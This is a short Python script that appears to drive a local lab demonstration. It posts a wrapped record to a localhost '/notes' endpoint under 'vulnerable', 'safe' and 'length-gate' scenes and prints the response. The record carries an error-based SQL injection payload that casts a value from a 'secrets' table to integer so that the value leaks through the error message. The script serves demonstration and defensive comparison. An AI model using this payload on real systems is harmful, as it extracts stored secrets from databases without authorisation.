#!/usr/bin/env python3
"""Print one exchange with the local lab. The VHS tapes record this output."""

import json
import sys
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "poc"))

from wrap import wrap

BASE = "http://127.0.0.1:18080"
PAYLOAD = "'||CAST((SELECT value FROM secrets LIMIT 1) AS integer)||'"


def record_for(scene):
    if scene == "length-gate":
        return "v1|00FF|nope"
    if scene in {"vulnerable", "safe"}:
        return wrap(PAYLOAD)
    sys.exit(f"unknown scene {scene!r}")


def main():
    if len(sys.argv) != 2:
        sys.exit("usage: show.py length-gate|vulnerable|safe")
    record = record_for(sys.argv[1])
    body = json.dumps({"record": record}).encode()
    request = urllib.request.Request(
        BASE + "/notes",
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(request, timeout=5) as response:
            status, raw = response.status, response.read().decode()
    except urllib.error.HTTPError as exc:
        status, raw = exc.code, exc.read().decode()
    print("POST /notes")
    print(f"record: {record}")
    print()
    print(f"HTTP {status}")
    print(json.dumps(json.loads(raw), indent=2))


if __name__ == "__main__":
    main()
